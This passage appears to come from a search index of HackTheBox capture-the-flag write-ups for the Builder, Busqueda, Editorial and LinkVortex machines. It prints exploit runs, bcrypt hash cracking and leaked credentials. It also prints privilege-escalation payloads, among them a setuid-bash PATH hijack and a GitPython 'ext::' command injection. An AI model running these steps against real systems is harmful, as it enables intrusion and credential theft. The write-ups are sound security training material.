&lt;hudson.model.PaneStatusProperties&gt;\n      &lt;collapsed/&gt;\n    &lt;/hudson.model.PaneStatusProperties&gt;\n    &lt;jenkins.security.seed.UserSeedProperty&gt;\n      &lt;seed&gt;4026dd2a6d770b27&lt;/seed&gt;\n    &lt;/jenkins.security.seed.UserSeedProperty&gt;\n    &lt;hudson.search.UserSearchProperty&gt;\n      &lt;insensitiveSearch&gt;true&lt;/insensitiveSearch&gt;\n    &lt;/hudson.search.UserSearchProperty&gt;\n    &lt;hudson.model.TimeZoneProperty/&gt;\n    &lt;jenkins.model.experimentalflags.UserExperimentalFlagsProperty&gt;\n      &lt;flags/&gt;\n    &lt;/jenkins.model.experimentalflags.UserExperimentalFlagsProperty&gt;\n    &lt;hudson.security.HudsonPrivateSecurityRealm_-Details&gt;\n      &lt;passwordHash&gt;#jbcrypt:$2a$10$6EJPyIFRC3o7PO1O3/ezcenFFtpgbU57.sggFWDvzPwe6mgr0EhEC&lt;/passwordHash&gt;\n    &lt;/hudson.security.HudsonPrivateSecurityRealm_-Details&gt;\n    &lt;jenkins.security.ApiTokenProperty&gt;\n      &lt;tokenStore&gt;\n        &lt;tokenList/&gt;\n      &lt;/tokenStore&gt;\n    &lt;/jenkins.security.ApiTokenProperty&gt;\n  &lt;/properties&gt;\n&lt;/user&gt;$ \n</code></pre>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"builder/#initial-access","title":"Initial Access","text":"<p>Now, on the box.</p> <pre><code>$ python 51993.py -u http://10.10.11.10:8080/ -p /var/jenkins_home/users/users.xml          \n&lt;?xml version='1.1' encoding='UTF-8'?&gt;\n      &lt;string&gt;jennifer_12108429903186576833&lt;/string&gt;\n  &lt;idToDirectoryNameMap class=\"concurrent-hash-map\"&gt;\n    &lt;entry&gt;\n      &lt;string&gt;jennifer&lt;/string&gt;\n  &lt;version&gt;1&lt;/version&gt;\n&lt;/hudson.model.UserIdMapper&gt;\n  &lt;/idToDirectoryNameMap&gt;\n&lt;hudson.model.UserIdMapper&gt;\n    &lt;/entry&gt;\n</code></pre> <p>And now <code>jennifer</code>'s xml</p> <pre><code>$ python 51993.py -u http://10.10.11.10:8080/ -p /var/jenkins_home/users/jennifer_12108429903186576833/config.xml\n    &lt;hudson.tasks.Mailer_-UserProperty plugin=\"mailer@463.vedf8358e006b_\"&gt;\n    &lt;hudson.search.UserSearchProperty&gt;\n      &lt;roles&gt;\n    &lt;jenkins.security.seed.UserSeedProperty&gt;\n      &lt;/tokenStore&gt;\n    &lt;/hudson.search.UserSearchProperty&gt;\n      &lt;timeZoneName&gt;&lt;/timeZoneName&gt;\n  &lt;properties&gt;\n    &lt;jenkins.security.LastGrantedAuthoritiesProperty&gt;\n      &lt;flags/&gt;\n    &lt;hudson.model.MyViewsProperty&gt;\n&lt;/user&gt;\n    &lt;/jenkins.security.ApiTokenProperty&gt;\n      &lt;views&gt;\n        &lt;string&gt;authenticated&lt;/string&gt;\n    &lt;org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin=\"display-url-api@2.200.vb_9327d658781\"&gt;\n&lt;user&gt;\n          &lt;name&gt;all&lt;/name&gt;\n  &lt;description&gt;&lt;/description&gt;\n      &lt;emailAddress&gt;jennifer@builder.htb&lt;/emailAddress&gt;\n      &lt;collapsed/&gt;\n    &lt;/jenkins.security.seed.UserSeedProperty&gt;\n    &lt;/org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty&gt;\n    &lt;/hudson.model.MyViewsProperty&gt;\n      &lt;domainCredentialsMap class=\"hudson.util.CopyOnWriteMap$Hash\"/&gt;\n          &lt;filterQueue&gt;false&lt;/filterQueue&gt;\n    &lt;jenkins.security.ApiTokenProperty&gt;\n      &lt;primaryViewName&gt;&lt;/primaryViewName&gt;\n      &lt;/views&gt;\n    &lt;/hudson.model.TimeZoneProperty&gt;\n    &lt;com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin=\"credentials@1319.v7eb_51b_3a_c97b_\"&gt;\n    &lt;/hudson.model.PaneStatusProperties&gt;\n    &lt;/hudson.tasks.Mailer_-UserProperty&gt;\n        &lt;tokenList/&gt;\n    &lt;jenkins.console.ConsoleUrlProviderUserProperty/&gt;\n        &lt;/hudson.model.AllView&gt;\n      &lt;timestamp&gt;1707318554385&lt;/timestamp&gt;\n          &lt;owner class=\"hudson.model.MyViewsProperty\" reference=\"../../..\"/&gt;\n  &lt;/properties&gt;\n    &lt;/jenkins.model.experimentalflags.UserExperimentalFlagsProperty&gt;\n    &lt;/com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty&gt;\n    &lt;hudson.security.HudsonPrivateSecurityRealm_-Details&gt;\n      &lt;insensitiveSearch&gt;true&lt;/insensitiveSearch&gt;\n          &lt;properties class=\"hudson.model.View$PropertyList\"/&gt;\n    &lt;hudson.model.TimeZoneProperty&gt;\n        &lt;hudson.model.AllView&gt;\n    &lt;/hudson.security.HudsonPrivateSecurityRealm_-Details&gt;\n      &lt;providerId&gt;default&lt;/providerId&gt;\n      &lt;/roles&gt;\n    &lt;/jenkins.security.LastGrantedAuthoritiesProperty&gt;\n    &lt;jenkins.model.experimentalflags.UserExperimentalFlagsProperty&gt;\n    &lt;hudson.model.PaneStatusProperties&gt;\n&lt;?xml version='1.1' encoding='UTF-8'?&gt;\n  &lt;fullName&gt;jennifer&lt;/fullName&gt;\n      &lt;seed&gt;6841d11dc1de101d&lt;/seed&gt;\n  &lt;id&gt;jennifer&lt;/id&gt;\n  &lt;version&gt;10&lt;/version&gt;\n      &lt;tokenStore&gt;\n          &lt;filterExecutors&gt;false&lt;/filterExecutors&gt;\n    &lt;io.jenkins.plugins.thememanager.ThemeUserProperty plugin=\"theme-manager@215.vc1ff18d67920\"/&gt;\n      &lt;passwordHash&gt;#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a&lt;/passwordHash&gt;\n</code></pre> <p>Crack the password with <code>hashcat</code> using module <code>3200</code>:</p> <pre><code>$ hashcat -m 3200 hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz --force\n...\n\n$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a:princess\n</code></pre> <p>We retrieve <code>jennifer:princess</code>, enter the username and password in Jenkins.</p> <p>Inside <code>Management &gt; Credentials</code>, we notice that there is a <code>root</code> user with an SSH key.</p> <p></p> <p>Click on update and see the concealed credentials.</p> <p></p> <p>Using Firefox's developer console, get the value.</p> <p></p> <p>Go to Script Console.</p> <p></p> <p>Using <code>hudson.util.Secret.decrypt</code>, get the SSH key.</p> <p></p> <p>Put the key into an <code>id_rsa</code> file, set permissions to <code>600</code>, and enter the system as <code>root</code>.</p> <pre><code>$ ssh root@10.10.11.10 -i id_rsa \nWelcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-94-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/pro\n\n  System information as of Thu May 15 06:28:40 PM UTC 2025\n\n  System load:              0.0\n  Usage of /:               67.2% of 5.81GB\n  Memory usage:             41%\n  Swap usage:               0%\n  Processes:                220\n  Users logged in:          0\n  IPv4 address for docker0: 172.17.0.1\n  IPv4 address for eth0:    10.10.11.10\n  IPv6 address for eth0:    dead:beef::250:56ff:fe94:ffd8\n\n\nExpanded Security Maintenance for Applications is not enabled.\n\n0 updates can be applied immediately.\n\nEnable ESM Apps to receive additional future security updates.\nSee https://ubuntu.com/esm or run: sudo pro status\n\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\n\nLast login: Mon Feb 12 13:15:44 2024 from 10.10.14.40\nroot@builder:~# whoami\nroot\n</code></pre>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"builder/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag</p> <pre><code>root@builder:~# cat root.txt\n73f92cd64712c975042efbe9d114d6ac\n</code></pre>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"busqueda/","title":"Busqueda","text":"","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"busqueda/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.11.208\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-07 17:27 CEST\nNmap scan report for 10.10.11.208\nHost is up (0.041s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)\n|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)\n80/tcp open  http    Apache httpd 2.4.52\n|_http-title: Did not follow redirect to http://searcher.htb/\n|_http-server-header: Apache/2.4.52 (Ubuntu)\nDevice type: general purpose|router\nRunning: Linux 5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 2 hops\nService Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 22/tcp)\nHOP RTT      ADDRESS\n1   40.61 ms 10.10.14.1\n2   40.83 ms 10.10.11.208\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 26.88 seconds\n</code></pre> <p>Add <code>searcher.htb</code> to <code>/etc/hosts</code>.</p> <p>The site is a Flask project using <code>searchor</code> <code>2.4.0</code>.</p> <p></p> <p>Searching a little, we find a POC.</p> <p>https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-</p>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"busqueda/#initial-access","title":"Initial Access","text":"<p>So, capture the request with Caido and edit the <code>search</code> param.</p> <p></p> <pre><code>$ rlwrap nc -lnvp 7777                        \nlistening on [any] 7777 ...\nconnect to [10.10.14.14] from (UNKNOWN) [10.10.11.208] 42334\n/bin/sh: 0: can't access tty; job control turned off\n$ whoami\nsvc\n</code></pre> <p>Get the flag</p> <pre><code>$ cat user.txt\n0d5be9ebe2b24d31d36913f7abe06b8a\n</code></pre>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"busqueda/#privilege-escalation","title":"Privilege Escalation","text":"<p>Inside the app project's folder there is a <code>.git</code> folder, the config file has the <code>svc</code> password.</p> <p></p> <p>Re-enter via SSH for an easier shell.</p> <pre><code>$ ssh svc@10.10.11.208\n\nWelcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-69-generic x86_64)\n\n...\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\n\nLast login: Tue Apr  4 17:02:09 2023 from 10.10.14.19\n</code></pre> <p>With <code>sudo -l</code>:</p> <pre><code>svc@busqueda:/opt/scripts$ sudo -l\n[sudo] password for svc: \nMatching Defaults entries for svc on busqueda:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser svc may run the following commands on busqueda:\n    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *\n</code></pre> <pre><code>svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' 960873171e2e | jq .\n</code></pre> <pre><code>\"Env\": [\n      \"USER_UID=115\",\n      \"USER_GID=121\",\n      \"GITEA__database__DB_TYPE=mysql\",\n      \"GITEA__database__HOST=db:3306\",\n      \"GITEA__database__NAME=gitea\",\n      \"GITEA__database__USER=gitea\",\n      \"GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh\",\n      \"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",\n      \"USER=git\",\n      \"GITEA_CUSTOM=/data/gitea\"\n    ],\n</code></pre> <pre><code>\"Env\": [\n      \"MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF\",\n      \"MYSQL_USER=gitea\",\n      \"MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh\",\n      \"MYSQL_DATABASE=gitea\",\n      \"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",\n      \"GOSU_VERSION=1.14\",\n      \"MYSQL_MAJOR=8.0\",\n      \"MYSQL_VERSION=8.0.31-1.el8\",\n      \"MYSQL_SHELL_VERSION=8.0.31-1.el8\"\n    ],\n</code></pre> <p>We can try these admin credentials on Gitea.</p> <p></p> <p>Looking at the code for <code>system-checkup.py</code> we can notice that <code>full-checkup.sh</code> is being called without an absolute path.</p> <p></p> <pre><code>svc@busqueda:/tmp$ echo -e '#!/bin/bash\\nchmod u+s /bin/bash' &gt; full-checkup.sh &amp;&amp; chmod +x full-checkup.sh\nsvc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup\n\n[+] Done!\nsvc@busqueda:/tmp$ bash -p\nbash-5.1# whoami\nroot\n</code></pre>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"busqueda/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag</p> <pre><code>bash-5.1# cat /root/root.txt\n59784d838c55bf5fe8089b49bac638d6\n</code></pre>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"editorial/","title":"Editorial","text":"","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"editorial/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.11.20\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-16 19:55 CEST\nNmap scan report for 10.10.11.20\nHost is up (0.041s latency).\nNot shown: 62780 closed tcp ports (reset), 2753 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)\n|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://editorial.htb\n|_http-server-header: nginx/1.18.0 (Ubuntu)\nDevice type: general purpose\nRunning: Linux 5.X\nOS CPE: cpe:/o:linux:linux_kernel:5.0\nOS details: Linux 5.0, Linux 5.0 - 5.14\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 22/tcp)\nHOP RTT      ADDRESS\n1   40.54 ms 10.10.14.1\n2   41.36 ms 10.10.11.20\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 27.26 seconds\n</code></pre> <p>Add <code>editorial.htb</code> to <code>/etc/hosts</code>.</p> <p>Browse the website:</p> <p></p> <p></p> <p>There is a form to submit book information with a preview button that makes a request to get an image. You can put an external URL and the request goes through, so this is an SSRF vulnerability.</p> <p>Examining the response with Caido, the response always returns a JPEG file.</p> <p></p> <p>We can try to enumerate internal ports by filtering the responses that do not return a <code>.jpg</code> file.</p> <p>Using Caido's Automate, load a list of all ports and filter by <code>resp.raw.ncont:\"jpeg\"</code>.</p> <p></p> <p>The only internal port that is not returning a JPEG is <code>5000</code>.</p> <p>Download the returned URL and see the content.</p> <pre><code>$ wget http://editorial.htb/static/uploads/47010b03-c3a5-47bf-b2bf-88eac775fb1a\n--2025-05-18 13:16:57--  http://editorial.htb/static/uploads/47010b03-c3a5-47bf-b2bf-88eac775fb1a\nResolving editorial.htb (editorial.htb)... 10.10.11.20\nConnecting to editorial.htb (editorial.htb)|10.10.11.20|:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 911 [application/octet-stream]\nSaving to: \u201847010b03-c3a5-47bf-b2bf-88eac775fb1a\u2019\n\n47010b03-c3a5-47bf-b2bf-88eac 100%[================================================&gt;]     911  --.-KB/s    in 0s      \n\n2025-05-18 13:16:57 (57.1 MB/s) - \u201847010b03-c3a5-47bf-b2bf-88eac775fb1a\u2019 saved [911/911]\n</code></pre> <pre><code>{\n  \"messages\": [\n    {\n      \"promotions\": {\n        \"description\": \"Retrieve a list of all the promotions in our library.\",\n        \"endpoint\": \"/api/latest/metadata/messages/promos\",\n        \"methods\": \"GET\"\n      }\n    },\n    {\n      \"coupons\": {\n        \"description\": \"Retrieve the list of coupons to use in our library.\",\n        \"endpoint\": \"/api/latest/metadata/messages/coupons\",\n        \"methods\": \"GET\"\n      }\n    },\n    {\n      \"new_authors\": {\n        \"description\": \"Retrieve the welcome message sended to our new authors.\",\n        \"endpoint\": \"/api/latest/metadata/messages/authors\",\n        \"methods\": \"GET\"\n      }\n    },\n    {\n      \"platform_use\": {\n        \"description\": \"Retrieve examples of how to use the platform.\",\n        \"endpoint\": \"/api/latest/metadata/messages/how_to_use_platform\",\n        \"methods\": \"GET\"\n      }\n    }\n  ],\n  \"version\": [\n    {\n      \"changelog\": {\n        \"description\": \"Retrieve a list of all the versions and updates of the api.\",\n        \"endpoint\": \"/api/latest/metadata/changelog\",\n        \"methods\": \"GET\"\n      }\n    },\n    {\n      \"latest\": {\n        \"description\": \"Retrieve the last version of api.\",\n        \"endpoint\": \"/api/latest/metadata\",\n        \"methods\": \"GET\"\n      }\n    }\n  ]\n}\n</code></pre> <p>Get the authors endpoint to find credentials in the message.</p> <p></p> <pre><code>$ wget http://editorial.htb/static/uploads/99b69cd0-bc8c-4713-897f-207c8841e123\n\n$ cat 99b69cd0-bc8c-4713-897f-207c8841e123 | jq .\n{\n  \"template_mail_message\": \"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\\n\\nYour login credentials for our internal forum and authors site are:\\nUsername: dev\\nPassword: dev080217_devAPI!@\\nPlease be sure to change your password as soon as possible for security purposes.\\n\\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\\n\\nBest regards, Editorial Tiempo Arriba Team.\"                                                                                         \n}\n</code></pre>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"editorial/#initial-access","title":"Initial Access","text":"<p>Connect to the machine via <code>ssh</code>:</p> <pre><code>$ ssh dev@10.10.11.20           \nThe authenticity of host '10.10.11.20 (10.10.11.20)' can't be established.\nED25519 key fingerprint is SHA256:YR+ibhVYSWNLe4xyiPA0g45F4p1pNAcQ7+xupfIR70Q.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.11.20' (ED25519) to the list of known hosts.\ndev@10.10.11.20's password: \nPermission denied, please try again.\ndev@10.10.11.20's password: \nWelcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)\n\nLast login: Mon Jun 10 09:11:03 2024 from 10.10.14.52\ndev@editorial:~$ whoami\ndev\n</code></pre> <p>Get the flag:</p> <pre><code>dev@editorial:~$ cat user.txt\nf9a7b485d37f289d6e983f00b029597f\n</code></pre>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"editorial/#privilege-escalation","title":"Privilege Escalation","text":"<p>Notice the <code>.git</code> folder in the user folder.</p> <p>Explore all the commits and show diffs for the third one.</p> <pre><code>dev@editorial:~/apps$ git log\ncommit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -&gt; master)\nAuthor: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;\nDate:   Sun Apr 30 21:04:21 2023 -0500\n\n    fix: bugfix in api port endpoint\n\ncommit dfef9f20e57d730b7d71967582035925d57ad883\nAuthor: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;\nDate:   Sun Apr 30 21:01:11 2023 -0500\n\n    change: remove debug and update api port\n\ncommit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae\nAuthor: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;\nDate:   Sun Apr 30 20:55:08 2023 -0500\n\n    change(api): downgrading prod to dev\n\n    * To use development environment.\n\ncommit 1e84a036b2f33c59e2390730699a488c65643d28\nAuthor: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;\nDate:   Sun Apr 30 20:51:10 2023 -0500\n\n    feat: create api to editorial info\n\n    * It (will) contains internal info about the editorial, this enable\n       faster access to information.\n\ncommit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8\nAuthor: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;\nDate:   Sun Apr 30 20:48:43 2023 -0500\n\n    feat: create editorial app\n\n    * This contains the base of this project.\n    * Also we add a feature to enable to external authors send us their\n       books and validate a future post in our editorial.\ndev@editorial:~/apps$ git show 1e84a036b2f33c59e2390730699a488c65643d28\ncommit 1e84a036b2f33c59e2390730699a488c65643d28\nAuthor: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;\nDate:   Sun Apr 30 20:51:10 2023 -0500\n\n    feat: create api to editorial info\n\n    * It (will) contains internal info about the editorial, this enable\n       faster access to information.\n</code></pre> <pre><code>dev@editorial:~/apps$ git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae\ncommit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae\nAuthor: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;\nDate:   Sun Apr 30 20:55:08 2023 -0500\n\n    change(api): downgrading prod to dev\n\n    * To use development environment.\n\ndiff --git a/app_api/app.py b/app_api/app.py\nindex 61b786f..3373b14 100644\n--- a/app_api/app.py\n+++ b/app_api/app.py\n@@ -64,7 +64,7 @@ def index():\n @app.route(api_route + '/authors/message', methods=['GET'])\n def api_mail_new_authors():\n     return jsonify({\n-        'template_mail_message': \"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\\n\\nYour login credentials for our internal forum and authors site are:\\nUsername: prod\\nPassword: 080217_Producti0n_2023!@\\nPlease be sure to change your password as soon as possible for security purposes.\\n\\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\\n\\nBest regards, \" + api_editorial_name + \" Team.\"\n+        'template_mail_message': \"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\\n\\nYour login credentials for our internal forum and authors site are:\\nUsername: dev\\nPassword: dev080217_devAPI!@\\nPlease be sure to change your password as soon as possible for security purposes.\\n\\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\\n\\nBest regards, \" + api_editorial_name + \" Team.\"\n     }) # TODO: replace dev credentials when checks pass\n\n # -------------------------------\n</code></pre> <p>The dev changed the user and password from <code>prod</code> to <code>dev</code>.</p> <p><code>prod:080217_Producti0n_2023!@</code></p> <p>Re-enter via <code>ssh</code>:</p> <pre><code>$ ssh prod@10.10.11.20\nprod@10.10.11.20's password: \nWelcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)\n\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\n\nprod@editorial:~$ whoami\nprod\n</code></pre> <p>This user can execute the following as <code>sudo</code>:</p> <pre><code>prod@editorial:~$ sudo -l\n[sudo] password for prod: \nMatching Defaults entries for prod on editorial:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser prod may run the following commands on editorial:\n    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *\n</code></pre> <pre><code>prod@editorial:~$ cat /opt/internal_apps/clone_changes/clone_prod_change.py\n#!/usr/bin/python3\n\nimport os\nimport sys\nfrom git import Repo\n\nos.chdir('/opt/internal_apps/clone_changes')\n\nurl_to_clone = sys.argv[1]\n\nr = Repo.init('', bare=True)\nr.clone_from(url_to_clone, 'new_changes', multi_options=[\"-c protocol.ext.allow=always\"])\n</code></pre> <p>Searching for an exploit, we find SNYK-PYTHON-GITPYTHON-3113858.</p> <p>So create a simple script to change <code>/bin/bash</code> permissions.</p> <pre><code>prod@editorial:~$ cat script.sh \nchmod +s /bin/bash\n</code></pre> <p>And execute the <code>sudo</code> command:</p> <pre><code>prod@editorial:~$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c bash% /home/prod/script.sh'\n...\n  cmdline: git clone -v -c protocol.ext.allow=always ext::sh -c bash% /home/prod/script.sh new_changes\n  stderr: 'Cloning into 'new_changes'...\nfatal: Could not read from remote repository.\n\nPlease make sure you have the correct access rights\nand the repository exists.\n'\nprod@editorial:~$ ls -alh /bin/bash\n-rwsr-sr-x 1 root root 1.4M Mar 14  2024 /bin/bash\n</code></pre> <pre><code>prod@editorial:~$ bash -p\nbash-5.1# whoami\nroot\n</code></pre>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"editorial/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag:</p> <pre><code>bash-5.1# cat /root/root.txt\n8163e03aff595a294efd3116d4019ad5\n</code></pre>","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"linkvortex/","title":"LinkVortex","text":"","tags":["\ud83d\udc27 Linux","\ud83d\udce6 HackTheBox","HackTheBox","Linux"]},{"location":"linkvortex/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.11.47   \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-06 20:45 CEST\nNmap scan report for 10.10.11.47\nHost is up (0.042s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)\n|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)\n80/tcp open  http    Apache httpd\n|_http-title: Did not follow redirect to http://linkvortex.htb/\n|_http-server-header: Apache\nDevice type: general purpose\nRunning: Linux 5.X\nOS CPE: cpe:/o:linux:linux_kernel:5.0\nOS details: Linux 5.0, Linux 5.0 - 5.14\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT      ADDRESS\n1   41.01 ms 10.10.14.1\n2   42.05 ms 10.10.11.47\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 24.64 seconds\n</code></pre> <p>Add <code>linkvortex.htb</code> to <code>/etc/hosts</code> and enter the webserver, which is a hardware blog powered by the Ghost service.</p> <p></p> <p><code>nikto</code> finds <code>robots.txt</code> with <code>/ghost</code></p> <p></p> <p>Using <code>wfuzz</code>, discover the <code>dev</code> subdomain and add it to <code>/etc/hosts</code>.</p> <pre><code>$ wfuzz -c --hh=230 -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H \"Host: FUZZ.linkvortex.htb\" http://linkvortex.htb\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://linkvortex.htb/\nTotal requests: 4989\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                          \n=====================================================================\n\n000000019:   200        115 L    255 W      2538 Ch     \"dev\"                            \n\nTotal time: 0\nProcessed Requests: 4989\nFiltered Requests: 4988\nRequests/sec.: 0\n</code></pre> <p></p> <p>With <code>feroxbuster</code> we find a <code>.git</code>, so using <code>git-dumper</code>:</p> <pre><code>$ python git-dumper/git_dumper.py http://dev.linkvortex.htb ./git\n[-] Testing http://dev.linkvortex.htb/.git/HEAD [200]\n[-] Testing http://dev.linkvortex.htb/.git/ [200]\n[-] Fetching .git recursively\n...\n[-] Sanitizing .git/config\n[-] Running git checkout .\nUpdated 5596 paths from the index\n</code></pre> <p>There is a <code>dev@linkvortex.htb</code>:</p> <pre><code>$ cat .git/logs/HEAD \n0000000000000000000000000000000000000000 299cdb4387763f850887275a716153e84793077d root &lt;dev@linkvortex.htb&gt; 1730322603 +0000      clone: from https://github.com/TryGhost/Ghost.git\n</code></pre> <p>The status shows two new files that are new:</p> <pre><code>$ git status                     \nNot currently on any branch.\nChanges to be committed:\n  (use \"git restore --staged &lt;file&gt;...\" to unstage)\n        new file:   